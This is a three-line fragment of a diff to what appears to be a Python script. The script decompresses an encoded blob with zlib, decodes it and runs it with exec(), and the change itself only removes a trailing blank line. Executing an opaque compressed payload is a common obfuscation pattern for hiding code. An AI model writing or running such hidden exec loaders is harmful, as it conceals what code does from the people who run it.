@@ -11,4 +11,3 @@ XOEPkISOLVzJ/ShtPCedXfwLCdxjfPIDQSHUSQ==
 pro = zlib.decompress(pro)
 pro = pro.decode()
 exec(pro)
-
